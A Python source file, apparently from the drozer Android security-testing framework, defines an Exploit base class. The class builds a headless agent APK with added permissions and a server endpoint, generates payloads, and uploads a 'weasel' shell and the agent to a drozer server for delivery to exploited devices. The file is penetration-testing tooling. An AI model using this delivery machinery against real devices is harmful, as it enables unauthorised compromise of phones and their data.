import sys

from drozer import util
from drozer.agent import builder, manifest
from drozer.server import uploader

class Exploit(object):
    
    def __init__(self, loader):
        self.__loader = loader
    
    def build_agent(self, arguments):
        source = arguments.no_gui and "guiless-agent" or "gui-agent"
        
        packager = builder.Packager()
        packager.copy_sources_from(source)
        
        if arguments.no_gui:
            e = manifest.Endpoint(packager.endpoint_path())
            if arguments.server != None:
                e.put_server(arguments.server)
            e.write()
        
        if arguments.permission != None:
            m = manifest.Manifest(packager.manifest_path())
            for p in arguments.permission:
                m.add_permission(p)
            m.write()
        
        return packager.package()
    
    def build_multipart(self, parts, boundary):
        body = ""
        
        for k in parts:
            body += "--" + boundary + "; " + k + "\n"
            body += parts[k] + "\n"
        
        return body
    
    def execute(self, arguments):
        arguments.no_gui = True # there is no point in deploying a full GUI agent at this point...
        
        arguments.format = self.payload_format
        
        if arguments.payload != "none" and not arguments.payload in self.payloads:
            sys.stderr.write("unsupported payload: " + arguments.payload + "\n")
            return
        
        arguments.server = util.parse_server(arguments.server)
        if arguments.push_server != None:
            arguments.push_server = util.parse_server(arguments.push_server)
        # generate the payload
        if arguments.payload != "none":
            self.payload = self.__loader.get(arguments.payload)(None).execute(arguments)
        # if the payload is for weasel, upload weasel to the server 
        if "weasel" in arguments.payload:
            if not self.upload_weasel(arguments):
                return
        # generate the exploit
        self.generate(arguments)

    def upload(self, arguments, resource, data, magic=None, headers=None):
        if uploader.upload(arguments, resource, data, magic=magic, headers=headers):
            print " [  OK  ]"
            
            return True
        else:
            print " [ FAIL ]"
            
            return False
        
    def upload_weasel(self, arguments):
        weasel = self.modules.get("weasel.shell")(None)
        
        print "Uploading weasel to /weasel and W...",
        if not self.upload(arguments, "/weasel", weasel.execute(arguments), magic="W"):
            return False
        print "Uploading the Agent to /agent.apk and A..."
        if not self.upload(arguments, "/agent.apk", self.build_agent(arguments), magic="A"):
            return False
        
        return True
        